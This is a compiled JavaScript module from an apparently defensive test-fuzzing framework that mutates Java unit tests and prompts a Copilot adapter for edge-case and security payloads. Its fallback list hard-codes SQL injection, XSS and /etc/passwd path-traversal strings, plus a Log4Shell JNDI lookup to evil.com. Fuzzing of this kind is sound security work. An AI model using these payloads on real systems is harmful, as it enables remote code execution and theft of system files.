"use strict";
/**
 * ===========================================================
 * MUTATION.TS
 * ===========================================================
 * Unified Dynamic Mutation Framework - DETERMINISTIC
 * - NO Math.random() - uses hashCode from metrics
 * - Copilot-driven mutations (NO parsing)
 * - Security payloads via Copilot
 * ===========================================================
 */
Object.defineProperty(exports, "__esModule", { value: true });
exports.MutationRegistry = exports.MutationStrategies = exports.SecurityEngine = void 0;
exports.getArchetypePrompt = getArchetypePrompt;
const metrics_js_1 = require("../metrics/metrics.js");
// Deterministic hash from metrics
function deterministicHash(str, seed = 0) {
    let h = seed;
    for (let i = 0; i < str.length; i++) {
        h = Math.imul(31, h) + str.charCodeAt(i);
        h |= 0;
    }
    return Math.abs(h);
}
// Deterministic selection from array
function deterministicSelect(arr, seed) {
    const index = deterministicHash(seed.toString(), seed) % arr.length;
    return arr[index];
}
/**
 * 🎯 Get archetype-specific prompt for Copilot
 * Tailors mutation instructions based on individual's role
 */
function getArchetypePrompt(baseContext, role, errors) {
    const basePrompt = `Generate pure Java code without markdown, backticks, or explanations.\n${baseContext}`;
    if (!role)
        return basePrompt;
    switch (role) {
        case 'fixer':
            return `${basePrompt}

🟢 FIXER MODE - Conservative Error Correction
FOCUS: Fix these specific compilation errors without adding new functionality:
${errors?.slice(0, 5).map((e, i) => `${i + 1}. ${e}`).join('\n') || 'General compilation errors'}

RULES:
- ONLY fix errors, don't add new test cases
- Preserve existing test logic
- Use minimal changes
- Ensure symbols are properly imported
- Return ONLY valid Java code (no markdown)`;
        case 'explorer':
            return `${basePrompt}

🔵 EXPLORER MODE - Creative Branch Coverage
FOCUS: Add innovative test cases that explore:
- Boundary conditions (null, empty, max, min)
- Unusual input combinations
- Edge cases not yet covered
- Different execution paths

RULES:
- Be creative and thorough
- Add new @Test methods (don't remove existing)
- Try unconventional inputs
- Return ONLY valid Java code (no markdown)`;
        case 'breaker':
            return `${basePrompt}

🔴 BREAKER MODE - Aggressive Bug Hunting
FOCUS: Create aggressive tests that might reveal bugs:
- Null inputs and null pointer scenarios
- Empty collections and arrays
- Concurrent access patterns
- Invalid state combinations
- Security vulnerabilities (injection, XSS, path traversal)
- Race conditions

RULES:
- Try to break the code!
- Test exceptional and error paths
- Use assertions that expect exceptions
- Return ONLY valid Java code (no markdown)`;
        default:
            return basePrompt;
    }
}
// ===========================================================
// SECURITY ENGINE (Copilot-driven)
// ===========================================================
class SecurityEngine {
    async applyDynamicPayload(input, ctx) {
        if (!ctx.copilotAdapter) {
            // Fallback: deterministic selection
            const payloads = ["' OR '1'='1'; --", "<script>alert('XSS')</script>", "../../etc/passwd", "${jndi:ldap://evil.com/x}"];
            return deterministicSelect(payloads, ctx.generation);
        }
        const prompt = `Generate a security fuzzing payload for ${ctx.language} (${ctx.domain}).
Target: ${ctx.lastError || 'injection attack'}
Original input: ${input}
Return ONLY the payload (no markdown, no explanations).`;
        try {
            const payload = await ctx.copilotAdapter.generateMutation(prompt);
            return payload.trim();
        }
        catch {
            return input; // Fallback
        }
    }
}
exports.SecurityEngine = SecurityEngine;
const securityEngine = new SecurityEngine();
// Formal strategy probabilities from optimal adaptation rate
const NUM_STRATEGIES = 5;
const baseRate = (0, metrics_js_1.optimalAdaptationRate)(NUM_STRATEGIES);
const probBoundary = baseRate * 2.5;
const probTypeFlip = baseRate * 1.5;
const probEncoding = baseRate * 1.5;
const probSecurity = baseRate * 2.5;
const probCopilot = baseRate * 1.5;
exports.MutationStrategies = [
    {
        id: "boundary_value",
        category: "input",
        description: "Boundary values (deterministic)",
        probability: probBoundary,
        apply: async (test, ctx) => {
            const values = ["0", "1", "-1", String(Number.MAX_SAFE_INTEGER), String(Number.MIN_SAFE_INTEGER)];
            return { ...test, input: deterministicSelect(values, ctx.generation) };
        },
    },
    {
        id: "type_flip",
        category: "semantic",
        description: "Type flip via Copilot",
        probability: probTypeFlip,
        apply: async (test, ctx) => {
            if (!ctx.copilotAdapter) {
                // Deterministic fallback
                const v = test.input;
                if (v === "true")
                    return { ...test, input: "false" };
                if (v === "false")
                    return { ...test, input: "true" };
                return { ...test, input: v.split("").reverse().join("") };
            }
            const prompt = `Flip the type/value of this input for edge case testing:
Input: ${test.input}
Return ONLY the flipped value (no markdown).`;
            const flipped = await ctx.copilotAdapter.generateMutation(prompt);
            return { ...test, input: flipped.trim() };
        },
    },
    {
        id: "encoding_mutation",
        category: "input",
        description: "Encoding mutation (deterministic)",
        probability: probEncoding,
        apply: async (test, ctx) => {
            const encoders = [
                (s) => Buffer.from(s).toString("base64"),
                (s) => encodeURIComponent(s),
                (s) => s.normalize("NFKD"),
            ];
            const encoder = deterministicSelect(encoders, ctx.generation);
            return { ...test, input: encoder(String(test.input)) };
        },
    },
    {
        id: "security_dynamic",
        category: "security",
        description: "Security payload via Copilot (INPUT ONLY)",
        probability: probSecurity,
        apply: async (test, ctx) => {
            const newInput = await securityEngine.applyDynamicPayload(String(test.input), ctx);
            return { ...test, input: newInput };
        },
    },
    {
        id: "copilot_semantic",
        category: "semantic",
        description: "Copilot code mutation (CODE ONLY)",
        probability: probCopilot,
        apply: async (test, ctx) => {
            if (!ctx.copilotAdapter)
                return test;
            const prompt = `Mutate this ${ctx.language} test code to test a NEW edge case.
Keep test signature and package.
Return ONLY mutated code (no markdown).

Original:
\`\`\`${ctx.language}
${test.code}
\`\`\`

Mutated:`;
            try {
                const suggestion = await ctx.copilotAdapter.generateMutation(prompt);
                const codeMatch = suggestion.match(/```(?:\w+)?\s*([\s\S]*?)\s*```/);
                const mutatedCode = codeMatch ? codeMatch[1].trim() : suggestion.trim();
                return { ...test, code: mutatedCode };
            }
            catch {
                return test;
            }
        },
    },
];
// ===========================================================
// MUTATION REGISTRY
// ===========================================================
class MutationRegistry {
    constructor(domain = "backend") {
        this.domain = domain;
    }
    async applyRandomMutation(test, ctx) {
        const strategies = exports.MutationStrategies.filter((s) => this.domain === "backend" ? true : s.category !== "structural");
        // Deterministic selection based on generation seed
        const totalProb = strategies.reduce((sum, s) => sum + s.probability, 0);
        const seed = deterministicHash(test.name + ctx.generation, ctx.generation);
        const selection = (seed % 10000) / 10000.0 * totalProb;
        let acc = 0;
        for (const s of strategies) {
            acc += s.probability;
            if (selection <= acc)
                return s.apply(test, ctx);
        }
        return test;
    }
    getWeights() {
        const strategies = exports.MutationStrategies.filter(s => this.domain === 'backend' ? true : s.category !== 'structural');
        const weights = {};
        for (const s of strategies)
            weights[s.id] = s.probability;
        return weights;
    }
    updateWeights(newWeights) {
        for (const strat of exports.MutationStrategies) {
            if (newWeights[strat.id] !== undefined) {
                strat.probability = newWeights[strat.id];
            }
        }
    }
}
exports.MutationRegistry = MutationRegistry;
//# sourceMappingURL=mutation.js.map